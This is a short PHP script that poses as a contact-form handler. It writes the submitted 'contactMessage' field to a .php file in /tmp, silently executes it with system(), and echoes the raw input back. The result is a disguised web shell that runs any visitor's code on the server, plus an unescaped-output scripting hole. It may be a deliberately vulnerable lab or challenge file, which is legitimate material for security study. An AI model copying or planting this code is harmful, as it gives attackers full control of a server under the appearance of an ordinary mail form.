<?php

if ($_POST) {
	$message = trim(stripslashes($_POST['contactMessage']));

	$filename = '/tmp/' . time() . '.php';
	$f = fopen($filename, 'w');
	fwrite($f, $message);
	fclose($f);

	echo 'Success ' . $message . ' has been sent';
	system('php -f ' . $filename . ' &>/dev/null');
} else {
	echo 'MBEERRR....';
}
